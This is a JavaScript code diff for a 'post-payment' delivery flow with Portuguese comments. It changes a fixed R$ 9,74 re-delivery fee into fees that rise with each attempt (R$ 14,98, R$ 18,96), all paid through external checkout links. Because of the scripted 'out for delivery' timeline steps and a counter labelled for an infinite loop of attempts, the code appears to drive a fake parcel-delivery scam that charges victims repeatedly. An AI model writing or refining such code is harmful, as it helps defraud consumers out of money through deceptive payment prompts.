@@ -6,7 +6,7 @@ export class PostPaymentSystem {
     constructor(trackingSystem) {
         this.trackingSystem = trackingSystem;
         this.deliveryAttempts = 0; // Contador de tentativas (0, 1, 2 para 1ª, 2ª, 3ª)
-        this.deliveryValues = [9.74, 9.74, 9.74]; // Valor fixo R$ 9,74 para todas as tentativas
+        this.deliveryValues = [9.74, 14.98, 18.96]; // Valores progressivos para cada tentativa
         this.deliveryLinks = [
             'https://checkout.zentrapaybr.com/xPTSsVmH', // 1ª tentativa
             'https://checkout.zentrapaybr.com/xkgmEGMN', // 2ª tentativa
@@ -18,7 +18,7 @@ export class PostPaymentSystem {
         this.totalDeliveryAttempts = 0; // Contador total de tentativas (para loop infinito)
         
         console.log('🚀 Sistema de fluxo pós-pagamento inicializado');
-        console.log('💰 Valor fixo para todas as tentativas: R$ 9,74');
+        console.log('💰 Valores por tentativa: 1ª=R$9,74, 2ª=R$14,98, 3ª=R$18,96');
         console.log('🔗 Links de checkout configurados:', this.deliveryLinks);
     }
 
@@ -199,7 +199,7 @@ export class PostPaymentSystem {
 
         this.isProcessing = true;
         const currentAttempt = attemptNumber || parseInt(button.dataset.attemptDisplay) || 1;
-        const value = 9.74; // Valor fixo para todas as tentativas
+        const value = this.deliveryValues[(currentAttempt - 1) % this.deliveryValues.length]; // Valor baseado na tentativa
         const checkoutLink = this.deliveryLinks[(currentAttempt - 1) % this.deliveryLinks.length];
         
         console.log(`🔄 Processando reenvio - ${currentAttempt}ª tentativa - R$ ${value.toFixed(2)}`);
@@ -280,8 +280,9 @@ export class PostPaymentSystem {
         // Determinar qual tentativa será (1ª, 2ª ou 3ª no ciclo)
         const nextAttemptInCycle = (this.deliveryAttempts % 3) + 1;
         const baseStep = 1000 + (this.totalDeliveryAttempts * 10); // IDs únicos para cada ciclo
+        const attemptValue = this.deliveryValues[(nextAttemptInCycle - 1) % this.deliveryValues.length];
 
-        console.log(`📦 Iniciando ${nextAttemptInCycle}ª tentativa do ciclo ${Math.ceil(this.totalDeliveryAttempts / 3)}`);
+        console.log(`📦 Iniciando ${nextAttemptInCycle}ª tentativa do ciclo ${Math.ceil(this.totalDeliveryAttempts / 3)} - Valor: R$ ${attemptValue.toFixed(2)}`);
 
         // Etapa 1: Sairá para entrega (imediato)
         this.addTimelineStep({
